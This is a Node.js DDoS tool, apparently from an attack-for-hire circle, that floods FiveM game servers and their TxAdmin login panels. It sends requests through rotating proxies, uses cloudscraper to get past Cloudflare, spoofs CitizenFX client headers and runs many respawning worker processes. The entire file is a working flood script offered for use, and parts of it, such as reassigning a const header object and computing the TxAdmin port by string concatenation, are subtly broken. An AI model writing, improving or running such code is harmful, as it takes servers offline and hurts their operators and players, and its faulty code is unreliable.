// Proxied FIVEM Flood by https://t.me/DarkLord_133
// Developed for Apofis & MyAPI
// THIS IS AN OLD VERSION
const cloudscraper = require('cloudscraper');
const fs = require('fs');
const { v4: uuidv4 } = require('uuid');
const cluster = require('cluster');
const os = require('os');
const events = require('events');
events.EventEmitter.defaultMaxListeners = 50;


if (process.argv.length < 8) {
    console.log("Usage: node script.js [IP] [Game Port] [Mode True for stealth False for food] [Time] [proxies_file_path] [threads] [Txadmin PORT]");
    console.log("Example: node script.js 1.1.1.1 30120 False 120 http.lst threads TX-AdminPORT");
    process.exit(1);
}

const ip = process.argv[2];
const port = process.argv[3];
const safeMode = process.argv[4].toLowerCase() === 'true';
const duration = parseInt(process.argv[5], 10);
const proxiesFilePath = process.argv[6];
const threads = process.argv[7];
const Txadminport = process.argv[8];

let txport;


if (Txadminport) {
   txport = parseInt(Txadminport, 10); // Ensure Txadminport is an integer
   console.log(`TX Admin Port is set to: ${txport} by the user`);

} else {
   txport = port + 10000;
   console.log('Tx admin port may be diferent, as the user never entered the TX port its calculated based on the game port.')
}



const proxies = fs.readFileSync(proxiesFilePath, 'utf-8').split('\n').filter(Boolean);

function getRandomProxy() {
    return proxies[Math.floor(Math.random() * proxies.length)];
}

async function worker(ip, port, endTime) {
    try {
        const proxy = getRandomProxy();
        const token = uuidv4();

        const clientHeaders = {
            "Host": `${ip}:${port}`,
            "User-Agent": 'CitizenFX',
            "Accept": "*/*"
        };
        const postData = {
            "method": "getEndpoints",
            "token": token
        };
        const postHeaders = {
            "Host": `${ip}:${port}`,
            "User-Agent": "CitizenFX/1",
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": "62"
        };

        while (Date.now() < endTime) {
            try {
                await cloudscraper.get({
                    uri: `http://${ip}:${port}/info.json`,
                    headers: clientHeaders,
                    proxy: `http://${proxy}`
                });
            } catch (error) {
                if (safeMode) {
                    break;
                }
            }

            try {
                await cloudscraper.post({
                    uri: `http://${ip}:${port}/client`,
                    headers: postHeaders,
                    body: JSON.stringify(postData),
                    proxy: `http://${proxy}`
                });
            } catch (error) {
                if (safeMode) {
                    break;
                }
            }

            clientHeaders["User-Agent"] = "CitizenFX/1";
            try {
                await cloudscraper.get({
                    uri: `http://${ip}:${port}/info.json`,
                    headers: clientHeaders,
                    proxy: `http://${proxy}`
                });

            } catch (error) {
                if (safeMode) {
                    break;
                }
            }

            postData["X-CitizenFX-Token"] = token;
            postHeaders['User-Agent'] = "CitizenFX/1";
            postHeaders["Content-Length"] = "23";
            postData["method"] = "getConfiguration";
            try {
                await cloudscraper.post({
                    uri: `http://${ip}:${port}/client`,
                    headers: postHeaders,
                    body: JSON.stringify(postData),
                    proxy: `http://${proxy}`
                });
            } catch (error) {
                if (safeMode) {
                    break;
                }
            }

            clientHeaders = {
                "Host": `${ip}:${port}`,
                "User-Agent": "CitizenFX/1.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Priority": "u=1"
            };
            try {
                if (safeMode) {
                    await cloudscraper.get({
                        uri: `http://${ip}:${port}/players.json`,
                        headers: clientHeaders,
                        proxy: `http://${proxy}`
                    });
                    await cloudscraper.get({
                        uri: `http://${ip}:${port}`,
                        headers: clientHeaders,
                        proxy: `http://${proxy}`,
                        followAllRedirects: true
                    });
                    await cloudscraper.get({
                        uri: `http://${ip}:${txport}`,   // Hit the TX Admin Main route 
                        headers: clientHeaders,
                        proxy: `http://${proxy}`,
                        followAllRedirects: true   // Dubble Request to /login route   login redirect
                    });
                    await cloudscraper.get({
                        uri: `http://${ip}:${txport}/login`,   // Hit the TX Admin Main login route 
                        headers: clientHeaders,
                        proxy: `http://${proxy}`,
                        followAllRedirects: true   // Dubble Request to /login route   login
                    });
                
                }else{
                    

                    await cloudscraper.get({
                        uri: `https://${ip}:${port}/players.json`,
                        headers: clientHeaders,
                        proxy: `http://${proxy}`
                    });
                    await cloudscraper.get({
                        uri: `https://${ip}:${port}`,
                        headers: clientHeaders,
                        proxy: `http://${proxy}`,
                        followAllRedirects: true
                    });
                    await cloudscraper.get({
                        uri: `https://${ip}:${port}/info.json`,
                        headers: clientHeaders,
                        proxy: `http://${proxy}`
                    });
                    await cloudscraper.get({
                        uri: `https://${ip}:${port}/${token}`,
                        headers: clientHeaders,
                        proxy: `http://${proxy}`
                    });

                    await cloudscraper.get({
                        uri: `http://${ip}:${port}`,
                        headers: clientHeaders,
                        proxy: `http://${proxy}`,
                        followAllRedirects: true
                    });
                    await cloudscraper.get({
                        uri: `http://${ip}:${txport}/login`,
                        headers: clientHeaders,
                        proxy: `http://${proxy}`,
                        followAllRedirects: true
                    });
                    await cloudscraper.get({
                        uri: `http://${ip}:${txport}`,
                        headers: clientHeaders,
                        proxy: `http://${proxy}`,
                        followAllRedirects: true
                    });
                    await cloudscraper.get({
                        uri: `http://${ip}:${port}/players.json`,
                        headers: clientHeaders,
                        proxy: `http://${proxy}`
                    });
                    await cloudscraper.get({
                        uri: `http://${ip}:${port}`,
                        headers: clientHeaders,
                        proxy: `http://${proxy}`,
                        followAllRedirects: true
                    });
                    await cloudscraper.get({
                        uri: `http://${ip}:${port}/info.json`,
                        headers: clientHeaders,
                        proxy: `http://${proxy}`
                    });
                    await cloudscraper.get({
                        uri: `http://${ip}:${port}/${token}`,
                        headers: clientHeaders,
                        proxy: `http://${proxy}`
                    });
                    await cloudscraper.get({
                        uri: `http://${ip}:${port}`,
                        headers: clientHeaders,
                        proxy: `http://${proxy}`,
                        followAllRedirects: true
                    });
                }
            } catch (error) {
                if (safeMode) {
                    break;
                }
            }
            break;
        }
    } catch (error) {
    }
}

const endTime = Date.now() + duration * 1000;

if (cluster.isMaster) {
    const numCPUs = threads;

    for (let i = 0; i < numCPUs; i++) {
        cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
        cluster.fork();
    });
} else {
    setInterval(() => {
        worker(ip, port, endTime);
    }, 0);
}
